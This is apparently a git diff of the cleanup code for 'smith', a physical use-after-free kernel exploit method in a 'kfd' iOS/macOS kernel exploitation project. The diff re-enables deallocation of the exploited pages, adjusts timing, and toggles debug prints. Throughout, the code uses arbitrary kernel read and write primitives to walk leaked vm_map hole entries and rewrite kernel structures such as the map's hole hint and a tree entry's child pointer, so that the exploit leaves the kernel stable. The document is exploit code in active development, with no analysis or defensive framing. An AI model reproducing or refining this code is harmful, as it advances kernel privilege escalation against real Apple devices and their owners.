@@ -142,29 +142,29 @@ void smith_cleanup(struct kfd* kfd)
 {
     smith_helper_cleanup(kfd);
 
-//    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
-//    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
-//    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
-//
-//    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
-//    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);
-//
-//    vm_address_t address1 = smith->vme[0].address;
-//    vm_size_t size1 = smith->vme[0].size + (min_puaf_page_uaddr - smith->vme[1].address);
-//    assert_mach(vm_deallocate(mach_task_self(), address1, size1));
-//
-//    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
-//    vm_size_t size2 = (smith->vme[2].address - address2) + smith->vme[2].size + smith->vme[3].size + smith->vme[4].size;
-//    assert_mach(vm_deallocate(mach_task_self(), address2, size2));
-//
-//    /*
-//     * No middle block if the kread and kwrite pages are the same or back-to-back.
-//     */
-//    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
-//        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
-//        vm_size_t size3 = (max_puaf_page_uaddr - address3);
-//        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
-//    }
+    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
+    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
+    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
+
+    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
+    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);
+
+    vm_address_t address1 = smith->vme[0].address;
+    vm_size_t size1 = smith->vme[0].size + (min_puaf_page_uaddr - smith->vme[1].address);
+    assert_mach(vm_deallocate(mach_task_self(), address1, size1));
+
+    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
+    vm_size_t size2 = (smith->vme[2].address - address2) + smith->vme[2].size + smith->vme[3].size + smith->vme[4].size;
+    assert_mach(vm_deallocate(mach_task_self(), address2, size2));
+
+    /*
+     * No middle block if the kread and kwrite pages are the same or back-to-back.
+     */
+    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
+        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
+        vm_size_t size3 = (max_puaf_page_uaddr - address3);
+        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
+    }
 }
 
 /*
@@ -418,7 +418,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          * Sleep an extra 100 us to make sure smith_helper_cleanup_pthread()
          * had the time to take the vm_map_lock().
          */
-        usleep(500);
+        usleep(100);
     }
 
     u64 map_kaddr = kfd->info.kaddr.current_map;
@@ -552,23 +552,23 @@ void smith_helper_cleanup(struct kfd* kfd)
         while (true) {
             hole_count++;
             print_message("Scan hole list: %llu", hole_count);
-            print_message("kread 1: %llu", hole_count);
+//            print_message("kread 1: %llu", hole_count);
             u64 hole_next = kget_u64(vm_map_entry__links__next, hole_kaddr);
-            print_message("kread 2: %llu", hole_count);
+//            print_message("kread 2: %llu", hole_count);
             u64 hole_start = kget_u64(vm_map_entry__links__start, hole_kaddr);
-            print_message("kread 3: %llu", hole_count);
+//            print_message("kread 3: %llu", hole_count);
             u64 hole_end = kget_u64(vm_map_entry__links__end, hole_kaddr); // panics here
 
             if (hole_start == 0) {
-                print_message("kread 4: %llu", hole_count);
+//                print_message("kread 4: %llu", hole_count);
                 first_leaked_hole_prev = kget_u64(vm_map_entry__links__prev, hole_kaddr);
                 first_leaked_hole_next = hole_next;
                 first_leaked_hole_end = hole_end;
-                usleep(1000);
+//                usleep(1000);
                 assert(prev_hole_end == smith->vme[1].address);
             } else if (hole_start == smith->vme[1].address) {
-                usleep(1000);
-                print_message("kread 5: %llu", hole_count);
+//                usleep(1000);
+//                print_message("kread 5: %llu", hole_count);
                 second_leaked_hole_prev = kget_u64(vm_map_entry__links__prev, hole_kaddr);
                 second_leaked_hole_next = hole_next;
                 assert(hole_end == smith->vme[2].address);
@@ -599,6 +599,12 @@ void smith_helper_cleanup(struct kfd* kfd)
          * We set map->hole_hint to point to the first hole, which is guaranteed
          * to not be one of the two holes that we just leaked.
          */
+        print_message("patch map->hole_hint");
+//        u64 vme_end0_start_and_next[2] = { vme_end0_start, (-1) };
+//        u64 unaligned_kaddr = vme_end0_kaddr + kfd_offset(vm_map_entry__links__start) + 1;
+//        u64 unaligned_uaddr = (u64)(&vme_end0_start_and_next) + 1;
+//        kwrite((u64)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(u64));
+//        kset_u64(vm_map_entry__links__end, leaked_entry_end, vme_end0_kaddr);
         kset_u64(_vm_map__hole_hint, first_hole_kaddr, map_kaddr);
     } while (0);
 
@@ -606,6 +612,7 @@ void smith_helper_cleanup(struct kfd* kfd)
         /*
          * Restore the entry to have its right child point to its original value.
          */
+        print_message("Restore the entry to have its right child point to its original value.");
         u64 entry_kaddr = atomic_load(&smith->cleanup_vme.kaddr);
         u64 entry_right = atomic_load(&smith->cleanup_vme.right);
         kset_u64(vm_map_entry__store__entry__rbe_right, entry_right, entry_kaddr);
